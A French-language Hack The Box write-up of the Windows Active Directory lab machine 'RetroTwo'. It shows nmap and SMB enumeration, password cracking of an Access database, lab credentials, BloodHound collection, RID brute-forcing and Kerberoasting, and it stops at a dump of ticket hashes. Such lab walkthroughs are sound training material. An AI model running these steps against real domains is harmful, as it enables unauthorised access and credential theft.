---
title: RetroTwo
date: 2025-12-11 10:28:41
categories: ["Machines", "Hackthebox"]
tags: ["Easy", "Windows", "Active Directory", "NetLogon"]
---

![RetroTwo](/images/RetroTwo/retro2.png)

RetroTwo est une machine Windows de difficulté facile, axée sur l'exploitation AD. L'énumération externe initiale révèle un partage SMB publiquement accessible contenant un fichier de base de données Microsoft Access, protégé par mot de passe. Après avoir craqué le mot de passe, le contenu du fichier `accdb` devient accessible, permettant de récupérer le script VBA à l'intérieur, où des identifiants AD peuvent être extraits. Ensuite, en abusant des comptes machine pré-créés, nous obtenons l'accès à un compte machine disposant du privilège `GenericWrite` sur un autre compte, qui, une fois exploité, fournit l'accès au système via RDP. Enfin, l'exploitation de la `clé de registre RpcEptMapper` permet l'escalade de privilèges vers un compte système.

## Énumération
### Scan de ports
Le scan `nmap` révèle 19 ports ouverts : `DNS`, `SMB`, `LDAP`, `WinRM` ainsi que d'autres ports Windows.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nmap 10.129.177.110 -T4 --min-rate 1000 -sV -sC -p- -oN full-tcp-scan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-24 21:42 CEST
Nmap scan report for 10.129.177.110
Host is up (0.062s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2025-07-24 19:44:36Z)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=BLN01.retro2.vl
| Not valid before: 2025-03-17T09:40:28
|_Not valid after:  2025-09-16T09:40:28
|_ssl-date: 2025-07-24T19:46:08+00:00; 0s from scanner time.
5722/tcp  open  msrpc              Microsoft Windows RPC
9389/tcp  open  mc-nmf             .NET Message Framing
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc              Microsoft Windows RPC
49167/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   210:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-07-24T19:45:30
|_  start_date: 2025-07-24T19:40:10
|_clock-skew: mean: -29m59s, deviation: 59m59s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: BLN01
|   NetBIOS computer name: BLN01\x00
|   Domain name: retro2.vl
|   Forest name: retro2.vl
|   FQDN: BLN01.retro2.vl
|_  System time: 2025-07-24T21:45:29+02:00
```

J'ajoute le nom de domaine dans le fichier `/etc/hosts`.
```bash
echo "10.129.177.110 retro2.vl bln01.retro2.vl bln01" | tee -a /etc/hosts
```

### DNS - TCP 53
Aucun autre enregistrement DNS trouvé avec `dig`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  dig any "retro2.vl" @"10.129.177.110"

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> any retro2.vl @10.129.177.110
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 59374
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: e08badc4eed7ee20 (echoed)
;; QUESTION SECTION:
;retro2.vl.                     IN      ANY

;; Query time: 19 msec
;; SERVER: 10.129.177.110#53(10.129.177.110) (TCP)
;; WHEN: Thu Jul 24 21:53:18 CEST 2025
;; MSG SIZE  rcvd: 50
```

### SMB - TCP 445
L'authentification en tant qu'anonyme est autorisée mais je ne peux pas lister les partages.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc smb bln01.retro2.vl -u '' -p ''
SMB         10.129.177.110  445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.177.110  445    BLN01            [+] retro2.vl\:
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc smb bln01.retro2.vl -u '' -p '' --shares
SMB         10.129.177.110  445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.177.110  445    BLN01            [+] retro2.vl\:
SMB         10.129.177.110  445    BLN01            [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Je teste alors avec le compte `Guest` et je vois qu'il a acces en lecture au patage `Public`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc smb bln01.retro2.vl -u 'Guest' -p ''
SMB         10.129.177.110  445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.177.110  445    BLN01            [+] retro2.vl\Guest:
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc smb bln01.retro2.vl -u 'Guest' -p '' --shares
SMB         10.129.177.110  445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.177.110  445    BLN01            [+] retro2.vl\Guest:
SMB         10.129.177.110  445    BLN01            [*] Enumerated shares
SMB         10.129.177.110  445    BLN01            Share           Permissions     Remark
SMB         10.129.177.110  445    BLN01            -----           -----------     ------
SMB         10.129.177.110  445    BLN01            ADMIN$                          Remote Admin
SMB         10.129.177.110  445    BLN01            C$                              Default share
SMB         10.129.177.110  445    BLN01            IPC$                            Remote IPC
SMB         10.129.177.110  445    BLN01            NETLOGON                        Logon server share
SMB         10.129.177.110  445    BLN01            Public          READ
SMB         10.129.177.110  445    BLN01            SYSVOL                          Logon server share
```

J'accède au partage Public et j'y télécharge un fichier ACCESS.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  smbclient //bln01.retro2.vl/Public -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Aug 17 16:30:37 2024
  ..                                  D        0  Sat Aug 17 16:30:37 2024
  DB                                  D        0  Sat Aug 17 14:07:06 2024
  Temp                                D        0  Sat Aug 17 13:58:05 2024

                6290943 blocks of size 4096. 821239 blocks available
smb: \> cd DB
smb: \DB\> dir
  .                                   D        0  Sat Aug 17 14:07:06 2024
  ..                                  D        0  Sat Aug 17 14:07:06 2024
  staff.accdb                         A   876544  Sat Aug 17 16:30:19 2024

                6290943 blocks of size 4096. 805092 blocks available
smb: \DB\> get staff.accdb
getting file \DB\staff.accdb of size 876544 as staff.accdb (229.1 KiloBytes/sec) (average 229.1 KiloBytes/sec)
smb: \DB\> cd ../Temp
smb: \Temp\> dir
  .                                   D        0  Sat Aug 17 13:58:05 2024
  ..                                  D        0  Sat Aug 17 13:58:05 2024

                6290943 blocks of size 4096. 805092 blocks available
smb: \Temp\> exit
```

## Shell en tant que admws01$
### Microsoft Access
Je vois qu'il s'agit d'un fichier `Microsoft Access Database`. En essayant de l'ouvrir avec Microsoft Access, je remarque qu'il est protégé par un mot de passe. Je crack dont le hash du fichier et trouve le mot de passe `class08`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  file staff.accdb
staff.accdb: Microsoft Access Database

╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  office2john.py staff.accdb > staff.hash

╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  john --wordlist=`fzf-wordlist` staff.hash

╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
class08          (staff.accdb)
1g 0:00:00:19 DONE (2025-07-24 22:04) 0.05051g/s 232.7p/s 232.7c/s 232.7C/s hellow..Liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

J'ouvre le fichier et s'y trouvent les identifiants `ldapreader:ppYaVcB5R`.
![](/images/RetroTwo/RetroTwo-1.png)

### BloodHound
J'utilise l'option `--bloodhound` de `netxec` pour récupérer les relations entre les objets du domaine.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc ldap bln01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R' --bloodhound -c All --dns-server 10.129.7.125
LDAP        10.129.7.125    389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl)
LDAP        10.129.7.125    389    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R
LDAP        10.129.7.125    389    BLN01            Resolved collection methods: acl, rdp, group, localadmin, container, trusts, objectprops, session, dcom, psremote
LDAP        10.129.7.125    389    BLN01            Done in 00M 15S
LDAP        10.129.7.125    389    BLN01            Compressing output into /root/.nxc/logs/BLN01_10.129.7.125_2025-07-28_200257_bloodhound.zip

```

En cherchant pendant quelques temps, je vois que `ldapreader` n'a aucun privilège nous permettant de continuer avec lui.
![](/images/RetroTwo/RetroTwo-2.png)

Je vois qu'il y a trois comptes machines.
![](/images/RetroTwo/RetroTwo-3.png)

### Kerberoasting
Avec l'option `--rid-brute` je récupère tous les utilisateurs du domaine.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc smb bln01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R' --rid-brute
SMB         10.129.7.125    445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.7.125    445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R
SMB         10.129.7.125    445    BLN01            498: RETRO2\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            500: RETRO2\Administrator (SidTypeUser)
SMB         10.129.7.125    445    BLN01            501: RETRO2\Guest (SidTypeUser)
SMB         10.129.7.125    445    BLN01            502: RETRO2\krbtgt (SidTypeUser)
SMB         10.129.7.125    445    BLN01            512: RETRO2\Domain Admins (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            513: RETRO2\Domain Users (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            514: RETRO2\Domain Guests (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            515: RETRO2\Domain Computers (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            516: RETRO2\Domain Controllers (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            517: RETRO2\Cert Publishers (SidTypeAlias)
SMB         10.129.7.125    445    BLN01            518: RETRO2\Schema Admins (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            519: RETRO2\Enterprise Admins (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            520: RETRO2\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            521: RETRO2\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            553: RETRO2\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.7.125    445    BLN01            571: RETRO2\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.7.125    445    BLN01            572: RETRO2\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.7.125    445    BLN01            1000: RETRO2\admin (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1001: RETRO2\BLN01$ (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1102: RETRO2\DnsAdmins (SidTypeAlias)
SMB         10.129.7.125    445    BLN01            1103: RETRO2\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            1104: RETRO2\staff (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            1105: RETRO2\Julie.Martin (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1106: RETRO2\Clare.Smith (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1107: RETRO2\Laura.Davies (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1108: RETRO2\Rhys.Richards (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1109: RETRO2\Leah.Robinson (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1110: RETRO2\Michelle.Bird (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1111: RETRO2\Kayleigh.Stephenson (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1112: RETRO2\Charles.Singh (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1113: RETRO2\Sam.Humphreys (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1114: RETRO2\Margaret.Austin (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1115: RETRO2\Caroline.James (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1116: RETRO2\Lynda.Giles (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1117: RETRO2\Emily.Price (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1118: RETRO2\Lynne.Dennis (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1119: RETRO2\Alexandra.Black (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1120: RETRO2\Alex.Scott (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1121: RETRO2\Mandy.Davies (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1122: RETRO2\Marilyn.Whitehouse (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1123: RETRO2\Lindsey.Harrison (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1124: RETRO2\Sally.Davey (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1127: RETRO2\ADMWS01$ (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1128: RETRO2\inventory (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1129: RETRO2\services (SidTypeGroup)
SMB         10.129.7.125    445    BLN01            1130: RETRO2\ldapreader (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1131: RETRO2\FS01$ (SidTypeUser)
SMB         10.129.7.125    445    BLN01            1132: RETRO2\FS02$ (SidTypeUser)

```

Pour les mettre directement dans un fichier j'utilise la commande suivante. Ensuite je supprime les groupes du fichier.
```bash
nxc smb bln01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R' --rid-brute | awk '{print($6)}' | cut -d '\' -f 2 > user.lst
```

Puis j'utilise le module `GetUserSPNs` de `Impacket` pour récupérer les hash des utilisateurs ayant un SPN. Souvent ce sont les hash des comptes machines qu'on peut récupérer ainsi.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  GetUserSPNs.py 'retro2.vl/ldapreader:ppYaVcB5R' -dc-host bln01.retro2.vl -outputfile Kerberoastables.txt -usersfile users.lst
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: admin - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: staff - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Julie.Martin - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Clare.Smith - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Laura.Davies - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Rhys.Richards - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Leah.Robinson - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Michelle.Bird - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Kayleigh.Stephenson - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Charles.Singh - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Sam.Humphreys - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Margaret.Austin - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Caroline.James - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Lynda.Giles - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Emily.Price - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Lynne.Dennis - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Alexandra.Black - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Alex.Scott - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Mandy.Davies - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Marilyn.Whitehouse - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Lindsey.Harrison - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Sally.Davey - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: ldapreader - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal:  - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```

J'obtiens les hash des comptes `krbtgt`, `BLN01$`, `FS02$` , `ADMWS01$` et `FS01$`.
```
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  cat Kerberoastables.txt
$krb5tgs$23$*krbtgt$RETRO2.VL$krbtgt*$1fec5dfe4059cbf64ff9baf41a0fe1da$0b3596c721a9827a5fd50d71f20adbc3432c8dc207cea2b735a4ebeaa8158f5c74093711f7d3f41e05c12011e1d09157aa1e956b2c7a9b272ea68137c735f1250dfd254faec2e31210e0072d4ff7bc530a3151ea9b030d36c118530a210c7a0d23dced737fa8e49967b0ff7759ed044094a2b496ec36d5ec514b69af0f1fd08353531b61c4aa2e01f38e0783c27f6a3f6b19218d0e06bc21f4ed54589f488efac1ee91aff5847352dceec660f4306279f005149c811a4cc18136fc012dd82a6d1360d375922568044396ea241baa8d3a3ed6bc723adeccc88a73cc5fb6f9a711e4ea59d1d601ffa6858e22a68b2265020b978d08a8ab15cc99337985f226f1d167def9bec30b99f75c351e36a2988f7a1669e6cb40ea503e7198f324e0cb56790393187546931fa2cb1208a62efab6a56d8d6ed30235214efa91af0578af8d05c79c5084c0dcb25cbffea1542ee2e64f4b07623a00e428f66e72e41a09d2b935335d9240451e6721cf7fa41c7c899a3fdd691a7b6357581728fd424b33dfda8c1edfaac6f3bf9477ba29998e99dd678e0ba23da97385b645787f3d2edcfa66cde9c56a0f26a9ff4207660583a80d0e22dff8fb36b7df3235ebedfe5806b359f52356b007536faf7d2ea2c16cc2110ffce07d8ba2b47210bace5252c9f90c84499fb40425b5ef87bef55b997046010979f035ee344b9b80c5717f4461b2b845528aa6da6e210b1db2afdd803bb5efce8848120d7ce575d0e5e388532c78a0d3d21b0cf6e755d6f3d4a1b72404d39858040836d0a41dba0f1ed56a24a98b620cbd1a505fbe5d48daa3dd62c7a5e987040b1f79bb662770cca2697a3e10eccf8ca32bf1e5d4dd430389455f678f6ba400f2df66d49075c006fcfe3b6a614a099657cb2b7d38e1a44fd5bc32f19fffe4aac4142d950fdf4c3081fe3542fb6589a5c26de22d1637bae4b705c83521fe5512af721063fc94436295d7fac75b0cea075bc62abb2cfd04e89c3cf3db6fcacd94d8b090e6b221fa5bd69b66f55c2c6f52219e48b7244bf150206773674df4642792cd308036f97d54ff96414c61f587bbbbe1ee99c7ee0482ec1fd025ac442bb52acfab7d5c9d10bd5d77d7166860654da71f6e3174bcc9a90e77f676ce91eabe1df0b0c9ccd1bf7b41d88f257d57ddd521ff1865adf54fbc98b28fddb333db1016f197bb6d66eb2b0af9c8f70761a08be556569e27ce27553d9d0ec46f6fa8c794c76223bcb6dbc3dfd756bc14549a3d8612869b3ad9522f4041330ed40404acb9d106dea6
$krb5tgs$23$*BLN01$$RETRO2.VL$BLN01$*$af130a02646333816764474b308b6b61$c2f68f16afad37f449389f0b1a3faf0f46bbf0731daff08966117180d4ff3a3b14ba579ec363f61e6821663268a42ce384c3116c0c8f51f8160a9f09ddbcab233ac02775befa594dfa09095b2f975bbb8ae575d0ff59befa3c16339b6c0d678f2abb24eb8b2124c774bede547ba615278f29938b4926dbe9214b8da15df6a38ff5a257559324c9e920d6556098b22931e863b6ae9ea57147bf4dadfadcfcf9a154b937250c906047f818f9edce75ffda0fa59b22c55b9dd830641990b3c596245ad54744f7f43c978fb19ef9845fc9526c1ab323110622be764703b6c294222b3ed781f8fdb0badbc82bc23caec2b6c2aa3f10a2b58266205ca5dae5c78e938e9d9e32f6283dcc5ff8ccaef421ae72059658d3e6d3a856c6d9a2eb23950c6f27536de79308affb3da4ffc1328eb858b8c9b9d4f741c42471e99fe1ceaed8eb054c19cf2b63c5b9468682df33316cb8adc1fd5dc3ee1634f4755e352bb8d5d96c653ee020e387a6e5bd542de8e7c0510615e6389436d966b0b0322724ca2017bd29fdfb580f7a501e187ac9a0433ab596955278f5205b004a93d6699a949ae48554a83b0cc35e5935a313ac74f69775bfc339f9f9f3dee8a16fa2f9ad2dcc371b573e04dfe4f475cd346cf3aba62ebe3e2865d7485eb9afe97ba1ef7a4eb1b8d58d0a0738dc9b9d76b4b81784cc36ffb407179abe908e7eacd319dfc40f2ab2e3c3c406e30fbfd82b7ab50790b8d41f17633fafc49207a8b99ff275de8917d340cfe7a1e95c28d407acb141c0217e25bb7ee5b6eba53d7af1470aeec002e10693f2f8353d0fa1e66860c07e17264604e5eeb65100bcdc72e591712c05cd545ab5719f9912755fd283561cd7e69013561d2c761eec33032d6575d41e60695f6551fb345a2bd9d769b7d1b5d6bb54d2423d07cc98d8cc18a3bdb63539df6319f0e4b797c31696b650d5769af0c583461cad6c12a9b91ce8667d375b4d1a9fd6fb24c3bd2d773c7e35f357b8d40b199ec8f43b1a16464dd463bde845261d9e35d7ffaf1b435e10fb9ea1edb1446483defe0ef8b8c6db0dfb2b34a1df9359bcda5119fce14ed0e646e14adeb49c4e9b92802b857fdfa7203e2884e910702e5e682ff34fde249342396cbf17c8f93876ed6aefab8ee0f71f0afbdea62e3e43aa823cfc6663309c39a9c2a74e478071c977e1e629366771ac14df78ced75c37c0b22d1344819fb37156a7851fd5fbdcea7c5058aa2c8386f679b75cdcfd6d4ecee349a665b47acc5893c3d0d2d0b07b3b6b0ba753eefd49
$krb5tgs$23$*ADMWS01$$RETRO2.VL$ADMWS01$*$5ec7dfe45c3c99974af846f2175f2a09$5d307a00fc1df2310f830ea91ef650f6fa850dc6a4bf53bf87143308cfcb7f97651218e40bba9ac918ef19a534eaf1911d571c0e5f60a71343f9c679e43d1c72187179c4ad5a1385ae84dc8db4b38eb769aeb2a3ef01fcb4d5efe7620675f2df07a4f4f9c508ddc26b87a0216acd41901b45e9deb1aec8b7efc66d84e709926122d83298680ea4c501db7f54480c12e007f422dc7bd6f8f2bac970d6e24fcaa54066aa11ef604f031ccb60d640c057e165f26d4c9d5e907c269eb6c5cf2c833cedbc03e4851bb5112c52e1ec9ce5e13bcba0dd0e958ab77bfce5ab2b78d409d3497174617142c453e3c7a5774e3fc5d122150f475328556a09f4111026350862081f35715651f8ba32c58a0a1e510e0468690a79b9dc2cf0df25c42210d7a4def7d23677ec860d986f289e851df945d5abd9a2348ebd704e754fa7b6240e9f821927c4f076aceab91ec265abab5e2885d8aaed5bc875ea85619bc034e42a3f92105b1dd3e317ea610690746ca4fe1bf74c799f3a8d0f4cc94bf884056dd352de900f183b4234a6ac6780b207aaa59375a9573ebcdbf5162f808f22ade57770602d36cdece6dbc622bd53340f7e69a35ac004a5b33ce13d5d2892fe314aae40489b9b6b1165edc035f641d126372e56c0babcd94c684e8143cc26961c6d91c8418a14dfd88401c8ffc3644204e8ee8368b1c746ff35509c33c8ad2944dbc2fc73b002f6ed1ea44f658108debc6dc958eb42f8e81c58eb6204e4f171e4e92e563a14299595ebc2c225274a739ad2116e2aab0fc5e9a94feb33a525ccaf1defb02b2f42cd6decec7fae3012bfc8551dcd24ed02105a1b058165e9361bf12b5f16112c40817d2f25d5d8b6f365ac201fd58ad80d25596f8571b92bf62da02443d4ab40c107f14c61aff09155dad1b66b174ca7f25e3fab34feaf681204a35422f2083d0017c42ebb717f628baabe05f23b16568113fcdeb9dde737bd3342c8b5aa2a8592a597ad5e29728456db5e7761994e4d8261d13afab2a3d00983e3ac79f6b2b082f7b101139299c60acd7dad6b6a3453e1a13b770e2305b7fb38a3d3ee995627e3375269b4e464fb883864be93d9583d7bce9a4dbec89fc5d1a2d5c2d2247becaf15e7ee8cb4ae257711e94839abc7a7a882fcb3656f79a6162b9fbb3ca585dd191647e9ce3234f968f8262f559062c6ba56c4acf6a387bdf7692b1e887650de78538727ecd72967ef48c8902d69e8ac949537578f86caf82ca373f5d8d0eb86521b467c2f352a0a27ddbae4c2130904fdd9a2
$krb5tgs$23$*FS01$$RETRO2.VL$FS01$*$2e1c6bcb3f45ec36ee82ee397c9f4944$568eda6bb65d55d22284f060f8eeb5e002df53117266b540c3da97ca555aeb1957d9050fca6fdc93c6f58dab9924601ba31acb598d8d00ab9df993b559573025c6749d5241d9b342188a39d69e24159d36b798b58616301aee774d3ef0908d15f78c90f747ba50d5dbba69bf5affe085006b5e3cfac65c639e91640a33f82732c3b925d385edc86d3085fcfa015c05ad008d8458484774efd6bd9f0eb709b6230af264df2ae63d13f8590ebc2e291ead1b2f015e17f21029d8051bec06a5880d8f670395319e04f546dec08ba6df38d2f834dd9121d16862533160883d22a074af4608c012cb6ed845830672ae4f3b1e281c83127da339bf6e96151d9d669258f4e1220737e3278f74e950a052ca7c36cd0711679842555d5f7b64e48d551787f21cda3e709d6e2296536baa000e3613fd55f34a36a8c5ee2bc486e78d2039717f893ce991bb7ed9b92c99617f3f179c8cae566e8551f6452dd24c716cf74cd9b45d0efccc3ead49389ac4b839e53aa1c516d7bbc37ce52b821c65fe59b566d74f234c2b770f5c4780661959d540d74d96573f66ebff5c5b78a380a289aba7afe79dac95a0fc6927d65d07646c58ba47227dfd96461ea99e719f487ca9291eaa3342166772f8fe79857fb7bf80a2f13113991c4e7c5413f8ec56b42afd77565f8243c65bc48742b115aa8a0873c86e0fcf1ef9b6de80aa4601d3fad52a88166734d24f4fc492faec676a7364cb66667f905b9f7a88fc62c74955421419b4fd9511070b3100486bfb36c7f693be57fa873c58d406f05053267d2f9cda5c995f67553fdd295ecb5b262432e3edd1012e9cd80910e3075d3ed5179b6fe18ef79461ccbd0983c6e12330073911a2b7f322925d1457a65eee90c4496cf0e27dad454345e13daa9af7824b7b6b5b2ea3d2745b6669aebbb7b0af0884f3ecce3069cff5488d831ea72022c95ff1d7c28ab21fd7b0217293256e810998e376ec519e11b788115bd801fce33cdc21b077d7670868d5c118ce3a44ae5358178b06aaa6fc1a17e898d13af9814e0abc1ab7de4f2f2be92e8a4fc722f2cb7edff197988d54a99bb25c7a71e93dff3d7f12f68a5feb1705e96950ba4dc97b6b6cc4daaff005881395cd43012d17df4e8c30fd50a72c65f8e5c56602ec0f856a481601997bf7e946e35a51c684beae78696e8d778b2854266019e01ee51a18a8a6d0aa1a7a37a8fcb8aa69863174c0403028025a91c6dbbe5b39160d8c3adb06270e083b4d1aebe2c0ca9d5fb0608ae6ca2b6201eb6af0298eb2d6
